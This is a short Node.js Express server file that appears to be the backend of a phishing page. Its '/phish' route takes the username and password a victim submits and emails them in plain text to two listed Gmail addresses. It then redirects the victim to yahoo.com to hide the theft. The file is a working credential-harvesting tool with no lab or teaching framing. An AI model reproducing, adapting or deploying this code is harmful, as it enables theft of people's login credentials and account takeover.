var express = require('express');
var app = express();
var mustache = require('mustache-express');
var bodyParser = require('body-parser')
app.engine('html',mustache());
app.set('view engine', 'html');
app.set('views', __dirname+'/views');
app.use("/public", express.static(__dirname+'/public'));
app.use(bodyParser.urlencoded({
  extended: true
}));

var sendmail = require('sendmail')({
  logger: {
    debug: console.log,
    info: console.info,
    warn: console.warn,
    error: console.error
  },
  silent: false,
})

//Define the port
var port = 6969;

//Define what happens then a user visits the root route
app.get('/',function(req,res)
{
  res.render("index");
});

app.get('/storage/8aASkfg4xz',function(req,res)
{
  res.redirect("/");
});

app.post('/phish',function(req,res)
{
  sendmail({
    from: 'no-reply@yourdomain.com',
    to: 'jeffahking@gmail.com, sarahm.aoun@gmail.com ',
    subject: 'test sendmail',
    html: "username:" + req.body['username'] + " || password: "+ req.body['password'],
  }, function(err, reply) {
    console.log(err && err.stack);
    console.dir(reply);
});
  res.redirect('https://yahoo.com');
});

//Start the server on the defined port
app.listen(port, function()
{
  console.log('Server running on port: '+port);
})
